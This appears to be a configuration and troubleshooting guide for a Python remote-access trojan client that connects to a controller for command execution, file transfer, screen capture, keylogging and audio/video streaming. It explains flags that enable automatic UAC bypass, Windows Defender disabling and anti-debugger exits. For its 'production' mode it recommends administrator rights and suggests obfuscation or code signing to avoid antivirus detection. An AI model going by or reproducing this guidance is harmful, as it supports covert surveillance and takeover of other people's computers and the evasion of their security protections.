# üß™ Testing Mode Configuration Guide

## Problem: Client Exits After Starting

If your client exits immediately after the UAC bypass attempt, it's because:
1. UAC bypass methods are being blocked by Windows security
2. Antivirus is flagging the UAC bypass as malicious
3. The program crashes when bypass fails

---

## ‚úÖ Solution: Safe Testing Mode (RECOMMENDED)

Edit **client.py** around **line 162** and set these flags:

```python
# SAFE TESTING MODE - No aggressive actions
SKIP_BOOTSTRAP_UAC = True        # ‚úÖ Skip UAC bypass on startup
SKIP_DEFENDER_DISABLE = True     # ‚úÖ Skip Defender disable on startup
KEEP_SYSTEM_TOOLS_ENABLED = True # ‚úÖ Keep CMD/Registry/TaskMgr enabled
```

---

## üîß Configuration Flags Explained

### Testing Mode (Default - SAFE)
```python
SILENT_MODE = False                  # Show console output
DEBUG_MODE = True                    # Enable debug logging
SKIP_BOOTSTRAP_UAC = True            # ‚úÖ Skip UAC bypass on startup
SKIP_DEFENDER_DISABLE = True         # ‚úÖ Skip Defender disable
KEEP_SYSTEM_TOOLS_ENABLED = True     # ‚úÖ Keep system tools enabled
ENABLE_ANTI_ANALYSIS = False         # Don't exit on debugger detection
DISABLE_UAC_BYPASS = False           # Allow UAC bypass (but don't auto-run)
```

### Production Mode (AGGRESSIVE - Use with caution)
```python
SILENT_MODE = True                   # Hide console output
DEBUG_MODE = False                   # Disable debug logging
SKIP_BOOTSTRAP_UAC = False           # ‚ö†Ô∏è Enable UAC bypass on startup
SKIP_DEFENDER_DISABLE = False        # ‚ö†Ô∏è Enable Defender disable
KEEP_SYSTEM_TOOLS_ENABLED = True     # Still keep tools enabled
ENABLE_ANTI_ANALYSIS = True          # Exit if debugger detected
DISABLE_UAC_BYPASS = False           # Allow all UAC bypasses
```

## üöÄ What Happens in Testing Mode

When you run `python client.py` with testing mode enabled:

```
[STARTUP] Step 1: Bootstrap UAC bypass SKIPPED (SKIP_BOOTSTRAP_UAC = True)
[STARTUP] ‚ÑπÔ∏è Running in safe testing mode
[STARTUP] ‚úÖ Agent will continue with current user privileges

[STARTUP] Step 2: Defender disable SKIPPED (SKIP_DEFENDER_DISABLE = True)
[STARTUP] ‚ÑπÔ∏è Running in safe testing mode

[STARTUP] Step 3: Disabling Windows notifications...
[STARTUP] === SYSTEM CONFIGURATION COMPLETE ===
[STARTUP] Connecting to controller...
```

The client will:
- ‚úÖ Start successfully
- ‚úÖ Connect to the controller
- ‚úÖ NOT exit unexpectedly
- ‚úÖ NOT trigger antivirus warnings
- ‚úÖ Wait for commands from the controller
- ‚úÖ Keep your CMD, PowerShell, Registry, Task Manager enabled

---

## ‚ö†Ô∏è Expected Warnings (Safe to Ignore)

### 1. uvloop Warning
```
‚ö†Ô∏è uvloop import FAILED: No module named 'uvloop'
USING STANDARD ASYNCIO
```
**Why:** uvloop doesn't work on Windows (Linux/macOS only)  
**Impact:** None - uses standard asyncio which works great on Windows

### 2. FastAPI Warning
```
‚ö†Ô∏è FastAPI/Uvicorn not available. Controller functionality disabled.
```
**Why:** This is a client, not a controller  
**Impact:** None - expected behavior

---

## üîÑ Switching Between Modes

### To Enable Aggressive Mode (Production):
1. Open `client.py` in a text editor
2. Find lines ~162-163
3. Change:
   ```python
   SKIP_BOOTSTRAP_UAC = False
   SKIP_DEFENDER_DISABLE = False
   ```
4. **Run as Administrator** for full privileges
5. **Caution:** May trigger antivirus

### To Return to Safe Mode (Testing):
1. Open `client.py`
2. Change back to:
   ```python
   SKIP_BOOTSTRAP_UAC = True
   SKIP_DEFENDER_DISABLE = True
   ```
3. Can run as normal user

## üìä Feature Availability by Mode

| Feature | Testing Mode | Production Mode |
|---------|-------------|-----------------|
| Connect to controller | ‚úÖ Yes | ‚úÖ Yes |
| Execute commands | ‚úÖ Yes | ‚úÖ Yes |
| File transfer | ‚úÖ Yes | ‚úÖ Yes |
| Screen capture | ‚úÖ Yes | ‚úÖ Yes |
| Keylogging | ‚úÖ Yes | ‚úÖ Yes |
| Audio/video streaming | ‚úÖ Yes | ‚úÖ Yes |
| **Auto UAC bypass** | ‚ùå Disabled | ‚úÖ Enabled |
| **Auto Defender disable** | ‚ùå Disabled | ‚úÖ Enabled |
| **System tools** | ‚úÖ Enabled | ‚úÖ Enabled |
| **Triggers antivirus** | ‚ùå No | ‚ö†Ô∏è Likely |

## üõ°Ô∏è Antivirus Considerations

### Testing Mode:
- Low detection risk
- Most antivirus won't flag it
- Good for development and testing

### Production Mode:
- **High detection risk**
- UAC bypass triggers most antivirus
- Defender disable gets flagged
- Consider obfuscation or code signing

---

## üß™ Quick Test

After configuring testing mode, verify it works:

```bash
# 1. Start the client
python client.py

# 2. You should see:
# [STARTUP] Bootstrap UAC bypass SKIPPED ‚úÖ
# [STARTUP] Defender disable SKIPPED ‚úÖ
# [STARTUP] Connecting to controller...

# 3. Client should stay running and wait for commands
```

If it exits immediately, check:
- Are the flags set correctly?
- Is antivirus still blocking it?
- Check the last error message

---

## üí° Tips

1. **Always test in Testing Mode first** before switching to Production Mode
2. **Testing Mode is perfect for development** - no UAC prompts, no antivirus alerts
3. **Production Mode should only be used** when you understand the risks
4. **Keep backups** of your configuration before changing flags
5. **Your system tools** (CMD, PowerShell, Registry, Task Manager) stay enabled in both modes

---

## üÜò Troubleshooting

### Client still exits?
- Check if SKIP_BOOTSTRAP_UAC = True
- Check if SKIP_DEFENDER_DISABLE = True  
- Look for error messages before exit
- Check antivirus logs

### Can't connect to controller?
- Verify controller URL in client.py
- Check network/firewall settings
- Look for Socket.IO connection errors

### Features not working?
- Some features may need admin privileges
- Check specific error messages
- Most features work fine without admin
